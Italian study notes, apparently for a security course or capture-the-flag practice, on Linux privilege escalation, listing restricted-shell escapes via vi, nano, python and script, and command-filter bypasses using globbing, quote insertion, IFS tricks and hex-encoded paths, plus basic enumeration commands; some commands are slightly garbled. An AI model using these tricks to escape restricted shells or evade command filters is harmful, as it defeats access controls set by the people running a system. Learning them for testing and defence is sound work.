### PRIVILEGE ESCALATION
- breve definizione
- `echo $SHELL`
- `echo $0`
- `bash`
- `/bin/bash`
- `/bin/sh`
- `vi`
- `vim`
- concetto di shell ristretta
- `vi -c !/bin/bash`
- nano e poi `ctrl+T` e poi chiudi con `ctrl+c` fa usare la shell diciamo
- se presente python
	- `python3 -c "import pty;pty.spawn("/bin/bash")"`
- `script -qc /qc/bin/bash/dev/null`
	- script serve a fare keylogging
- se hai il path del bin bloccato puoi provare a scrivere lo stesso path con dei caratteri casuali e potrebbe andare
	- tipo `/bin/b?ash`
	- tipo `/bin/b[a]sh`
	- `p${u}i${$u}n{$u}g local host`
		- `${u}` rappresenta una variabile d'ambiente da sostituire in questo caso con nulla
- concatenazione di comandi tipo `mi` poi `whoam` poi fai `!-1!-2` quindi eseguirà `whoami`
- `w'u'h'u'o'u'a'u'm'u'i`
- `cat ${IFS} /etc/passwd`
	- la variabile IFS vale come spazio
- `IFS=];b/bin/bash];$b`
	- metto IFS=]
	- quindi poi quando scriverò alla fine di bash una quadra chiusa mi metterà lo spazio
- `{cat,sbers.txt}`
- scrivi in esadecimale il path da eseguire
	- `$'\x2f\x62...`
	- `X=$'\x63\x64\x20;$X`
- `CyberChef` per convertire in esadecimale
- https://www.verylazytech.com/linux/bypassing-bash-restrictions-rbash
#### PRIVILEGE ESCALATION
- ENUMERATION
	- breve definizione su cosa consiste
- FINDING ATTACK VECTORS
	- breve definizione su cosa consiste
- EXPLOIT THEM
	- breve definizione su cosa consiste

##### Parte sulla ENUMERATION
##### MOTD
- message of the day
	- quello che appare quando accedi a una macchina `ssh`
- potrebbe contenere informazioni utili
- `cat /etc/motd`
- `cat /etc/update-motd.d/*`

##### Informazioni del SO
- sapere il SO serve soprattutto per usare exploit di SO vecchissimi
- `uname -a`
	- cosa fa


